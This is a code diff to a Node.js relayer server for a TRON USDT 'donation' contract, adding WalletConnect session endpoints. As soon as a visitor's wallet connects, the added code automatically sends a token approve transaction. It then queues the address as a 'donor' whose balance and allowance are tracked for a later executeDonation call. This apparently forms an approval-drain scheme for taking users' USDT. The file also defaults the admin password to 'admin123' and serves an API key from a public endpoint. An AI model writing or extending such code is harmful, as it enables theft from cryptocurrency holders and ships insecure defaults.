@@ -2,9 +2,12 @@ const http = require("http");
 const fs = require("fs");
 const path = require("path");
 const https = require("https");
+const crypto = require("crypto");
 
 // Load .env file
 require("dotenv").config();
+
+const wc = require("./walletconnect");
 
 // ============================================================
 // CONFIGURATION
@@ -20,6 +23,7 @@ const CONFIG = {
     TRONGRID_API_KEY: process.env.TRONGRID_API_KEY,
 
     ADMIN_PASSWORD: process.env.ADMIN_PASSWORD || "admin123",
+    WALLETCONNECT_PROJECT_ID: process.env.WALLETCONNECT_PROJECT_ID,
 
     // Public constants
     USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
@@ -319,7 +323,7 @@ const MIME_TYPES = {
     ".ico": "image/x-icon",
 };
 
-const server = http.createServer((req, res) => {
+const server = http.createServer(async (req, res) => {
     // API endpoint: public config (non-sensitive only)
     if (req.method === "GET" && req.url === "/api/config") {
         res.writeHead(200, { "Content-Type": "application/json" });
@@ -327,6 +331,64 @@ const server = http.createServer((req, res) => {
             trongridApiKey: CONFIG.TRONGRID_API_KEY,
             contractAddress: CONFIG.CONTRACT_ADDRESS,
         }));
+        return;
+    }
+
+    // ============================================================
+    // WALLETCONNECT API ENDPOINTS
+    // ============================================================
+
+    // Create a new WC session → returns QR URI
+    if (req.method === "POST" && req.url === "/api/wc/session") {
+        const sessionId = crypto.randomUUID();
+        try {
+            const uri = await wc.createSession(sessionId);
+            res.writeHead(200, { "Content-Type": "application/json" });
+            res.end(JSON.stringify({ sessionId, uri }));
+        } catch (e) {
+            res.writeHead(500, { "Content-Type": "application/json" });
+            res.end(JSON.stringify({ error: e.message }));
+        }
+        return;
+    }
+
+    // Check session status (polled by frontend)
+    if (req.method === "GET" && req.url.startsWith("/api/wc/status/")) {
+        const sessionId = req.url.split("/api/wc/status/")[1].split("?")[0];
+        const status = wc.getSessionStatus(sessionId);
+        if (!status) {
+            res.writeHead(404, { "Content-Type": "application/json" });
+            res.end(JSON.stringify({ error: "Session not found" }));
+            return;
+        }
+
+        // If wallet just connected, auto-send the approve TX
+        if (status.status === "connected") {
+            try {
+                addLog(`Wallet connected: ${status.address}. Sending approve TX...`, "info");
+                const result = await wc.sendApproveTransaction(sessionId, CONFIG);
+                if (result.success) {
+                    addLog(`Approve TX signed & broadcast: ${result.txId}`, "success");
+                    // Add donor to queue for executeDonation
+                    if (!processedDonors.has(result.donor)) {
+                        pendingDonors.set(result.donor, {
+                            queuedAt: new Date().toISOString(),
+                            txId: result.txId,
+                            balance: null,
+                            allowance: null,
+                            ready: false,
+                        });
+                        addLog(`Donor queued: ${result.donor}`, "info");
+                    }
+                }
+            } catch (e) {
+                addLog(`Approve TX failed: ${e.message}`, "error");
+            }
+        }
+
+        const updatedStatus = wc.getSessionStatus(sessionId);
+        res.writeHead(200, { "Content-Type": "application/json" });
+        res.end(JSON.stringify(updatedStatus));
         return;
     }
 
@@ -517,9 +579,21 @@ const server = http.createServer((req, res) => {
     });
 });
 
-server.listen(CONFIG.PORT, () => {
+server.listen(CONFIG.PORT, async () => {
     addLog(`Server running on port ${CONFIG.PORT}`, "success");
     addLog(`Relayer polling every ${CONFIG.POLL_INTERVAL / 1000}s`, "info");
     addLog(`Contract: ${CONFIG.CONTRACT_ADDRESS}`, "info");
     addLog(`Relayer: ${CONFIG.RELAYER_ADDRESS}`, "info");
+
+    // Initialize WalletConnect
+    if (CONFIG.WALLETCONNECT_PROJECT_ID) {
+        try {
+            await wc.initWalletConnect(CONFIG.WALLETCONNECT_PROJECT_ID);
+            addLog("WalletConnect initialized", "success");
+        } catch (e) {
+            addLog(`WalletConnect init failed: ${e.message}`, "error");
+        }
+    } else {
+        addLog("WALLETCONNECT_PROJECT_ID not set - WC disabled", "error");
+    }
 });
